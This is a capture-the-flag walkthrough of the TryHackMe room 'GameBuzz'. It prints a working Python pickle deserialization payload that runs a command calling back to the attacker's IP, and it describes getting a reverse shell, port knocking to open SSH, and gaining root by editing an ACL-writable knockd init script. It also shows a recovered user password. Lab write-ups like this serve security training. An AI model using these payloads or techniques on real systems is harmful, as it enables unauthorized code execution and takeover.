<h3> GameBuzz TryHackMe </h3>

Difficulty = Hard

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b8867ef-56a0-43e5-860d-f2453459c873)

Going over to the web server shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/72c13526-255a-4bc4-ae0b-8d729902260d)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/358c80bb-9bcd-49ff-9d4d-d22e05cf18b7)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57414644-72f7-45a4-8ba3-b3ba4eb2e751)

Noticing the email *admin@incognito.com* we can deduct that the domain name is *incognito.com*

I'll add that to my */etc/hosts* file

Now poking around this web app i saw the *Game Rating* function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/35f31582-8204-4839-a88f-ee25889b5252)

When you click it and then click game 1 with a proxy on this is what I got
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/73392813-ef46-4ce4-98e4-add3c1cfbfc9)

```json
{"object":"/var/upload/games/object.pkl"}
```

We can see that it's loading the object pickled file 🤔

Let's keep this in mind!

Now for more enumeration since we have the domain lets fuzz for sub domains 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a6783ee6-458f-4c0c-a655-c34d945fe539)

I got *dev* so i'll update my */etc/hosts* file with the new subdomain *dev.incognito.com*

Going over to the newly founded subdomain shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/406ca395-c76f-41f1-b11a-b2948a14d85a)

Checking */robots.txt* shows */secret*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2b6d8c8c-0285-4aec-bd2b-13f7bc04f112)

But after navigating to */secret* gives 403 forbidden
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/add9bbf8-6807-4155-ae7d-659b2488e247)

So I fuzzed for files there and got */upload*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c1966332-64c8-4382-8ed7-75c9343d5055)

Moving there shows an upload form 

Now this is good cause remember from the main domain we can call any pickled file and since we are opportuned to upload any file lets upload a pickle file

I made a script to make icmp callback to my host

```python
#!/usr/bin/python3
# Author: Hack.You
import os
import pickle

class Shell(object):
    def __reduce__(self):
        cmd = 'ping -c 5 10.2.42.156'
        return (os.system, (cmd,))

pickledData = pickle.dumps(Shell())
with open('payload.pkl', 'wb') as f:
    f.write(pickledData)

```

Running it creates the pickle file 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3d67b081-9fbf-44dd-92bf-e90fb55d9253)

Now let upload the serialized payload
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/edb33e1e-ad19-4e34-b60f-101383fcac10)

I already setup *tcpdump* listening for icmp connection 

```bash
sudo tcpdump -i tun0 icmp
```

Since the file is already uploaded we can call it via the fetch endpoint on the main domain
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9419975b-ed4c-4d53-9eb0-cec23cc454d6)

```json
{"object":"/var/upload/payload.pkl"}
```

Back on tcpdump we get a hit 😄
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8a0bdbe0-d147-4350-a9f5-de65e9ad368f)

Now lets get shell. Here's my payload [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/thm/GameBuzz/pickle.py)

After running it and uploading it then using the fetch endpoint to load the pickle data I got shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7ee6d51c-1040-4c2d-be89-184992a40d11)

Let do some privilege escalation 

Running linpeas shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f9e7b38c-e18f-46e5-afd3-12d59976714e)

Viewing the file gives the password for user dev1 as *dc647eb65e6711e155375218212b3964*

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b23adc48-ccec-49a1-b591-44f805c2e430)

But we can't switch to the user from the box so we need to login to ssh

But no ssh port is open

From the hint we are to do port knocking for we to get access to the ssh service

Looking at the knock config file shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8f9969a0-aaa0-4b25-ad6e-de2de82580c6)

This means we're to knock the followng ports *[5020,6120,7340]* for ssh to be open

Luckily there's an open source tool on kali that can easily do this for us
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a42f9b32-9a61-4c67-9722-ee7a508a6f37)

Now that ssh is open let us login as dev1
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e766b550-f2ef-471e-b284-70fee8cfba5a)

Checking *sudo -l* shows we can run as *root* on */etc/init.d/knockd*
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4cad41e1-c3db-484b-bdd2-ec0e5dd73d8e)

But we don't have write access over the file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a4915ecf-851b-4452-ba1e-3b763f9afaa3)

So i ran linpeas again and got this

It shows this file has ACL perm set on it

And to confirm it we can check it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fee6e2a0-0a09-42fb-9e5d-0cf821d92d16)

The *+* sign at the end of the perm signifies ACl 

With ACL set on we can change the permission on the file

So lets edit it to get a reverse shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4fa768fb-90a4-47b1-af59-8fefc4958d25)

Now lets restart the service
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8e541218-4b6a-4a7e-bdc7-b7cc82a9047d)

With this set we now need to stop the knock service and start it back then port knock the ports
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4ae77013-e51b-45fb-b299-1c9875140f9c)

And we're done 👻
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ed17bd46-1cda-46cf-801b-254300e3d2cb)


